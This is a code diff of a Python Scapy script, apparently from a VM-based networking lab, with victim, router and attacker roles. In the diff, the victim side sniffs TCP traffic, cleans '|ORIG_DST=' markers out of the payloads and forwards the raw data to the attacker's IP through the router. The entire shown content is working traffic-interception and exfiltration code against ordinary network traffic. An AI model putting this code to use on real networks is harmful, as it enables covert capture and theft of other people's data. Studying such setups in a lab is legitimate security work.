@@ -38,24 +38,32 @@ def send_to_router(packet):
 #Victim functions
 #---
 
+#"asd;fjasjkfa;fkjas;kjf;sdkjfsk |ORIG_DST=..." 
+
+
 #Sends packet to attacker (via the router VM)
 def send_to_attacker(packet):
     try:
         data = packet[Raw].load
     except:
         data = ''.encode("utf-8")
+    # If a packet with the attacker IP as destination was not found
     if(data.decode("utf-8").find('|ORIG_DST=' + my_ips.attacker_ip) == -1):
+        # If a packet already has "ORIG_DST" appended on the payload
         if(data.decode("utf-8").find('|ORIG_DST=') != -1):
             test_field = "|ORIG_DST="
+            # Get the part of the payload after "ORIG_DST = "
             tmp_data = data.decode("utf-8").partition(test_field)
+            # If other info. is also appended, such as another "ORIG_DST=..."
             if(tmp_data[2].find('|') != -1):
                 replacement_data = tmp_data[0] + tmp_data[2][tmp_data[2].find('|'):]
             else:
                 replacement_data = tmp_data[0]
             data = replacement_data.encode("utf-8")
-        new_packet = IP(dst=my_ips.attacker_ip)/TCP(dport=80)/Raw(load=data)
-
-        send_to_router(new_packet)
+        if(packet[IP].src == my_ips.router_ip):
+            new_packet = IP(dst=my_ips.attacker_ip)/TCP(dport=80)/Raw(load=data)
+            new_packet.show()
+            send_to_router(new_packet)
 #---
 
 #Router functions
@@ -162,7 +170,8 @@ if __name__=='__main__':
         role = 'router'
 
     if(role == 'victim'):
-        packet_sniffer('src host ' + local_ip + ' and tcp and not tcp[tcpflags] & (tcp-rst) != 0', send_to_attacker)
+        packet_sniffer('src host ' + my_ips.router_ip + ' and tcp and not tcp[tcpflags] & (tcp-rst) != 0', send_to_attacker)
+        #packet_sniffer('src host ' + my_ips.external_host_ip + ' and tcp and not tcp[tcpflags] & (tcp-rst) != 0', send_to_attacker)
     elif(role == 'router'):
         packet_sniffer('dst host ' + my_ips.router_ip + ' and tcp', reroute_packet)
     elif(role == 'attacker'):
